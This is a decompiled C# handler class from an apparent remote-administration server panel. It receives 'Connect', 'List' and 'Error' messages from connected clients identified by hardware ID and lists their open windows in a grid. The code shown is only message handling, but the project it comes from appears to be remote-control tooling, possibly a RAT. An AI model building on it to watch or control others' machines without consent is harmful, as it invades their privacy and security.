using System;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages
{
	// Token: 0x02000055 RID: 85
	internal class HandlerWindow
	{
		// Token: 0x060001E0 RID: 480 RVA: 0x0001DD20 File Offset: 0x0001BF20
		public static void Read(Clients client, object[] objects)
		{
			string a = (string)objects[1];
			if (!(a == "Connect"))
			{
				if (!(a == "List"))
				{
					if (!(a == "Error"))
					{
						return;
					}
					if (client.Tag == null)
					{
						client.Disconnect();
						return;
					}
					FormWindow form = (FormWindow)client.Tag;
					form.Invoke(new MethodInvoker(delegate()
					{
						form.materialLabel1.Text = "Error: " + (string)objects[2];
					}));
					return;
				}
				else
				{
					if (client.Tag == null)
					{
						client.Disconnect();
						return;
					}
					FormWindow form = (FormWindow)client.Tag;
					form.Invoke(new MethodInvoker(delegate()
					{
						form.dataGridView2.Rows.Clear();
						form.materialLabel1.Text = "Succues list window";
						int i = 2;
						while (i < objects.Length)
						{
							DataGridViewRow dataGridViewRow = new DataGridViewRow();
							dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
							{
								Value = (string)objects[i++]
							});
							dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
							{
								Value = (bool)objects[i++]
							});
							dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
							{
								Value = (int)objects[i++]
							});
							dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
							{
								Value = (int)objects[i++]
							});
							dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
							{
								Value = (string)objects[i++]
							});
							form.dataGridView2.Rows.Add(dataGridViewRow);
						}
					}));
					return;
				}
			}
			else
			{
				FormWindow form = (FormWindow)Application.OpenForms["Window:" + (string)objects[2]];
				if (form == null)
				{
					client.Disconnect();
					return;
				}
				form.Invoke(new MethodInvoker(delegate()
				{
					form.Text = "Window [" + (string)objects[2] + "]";
					form.materialLabel1.Text = "Succues Connect";
					form.client = client;
					form.dataGridView2.Enabled = true;
				}));
				client.Tag = form;
				client.Hwid = (string)objects[2];
				return;
			}
		}
	}
}
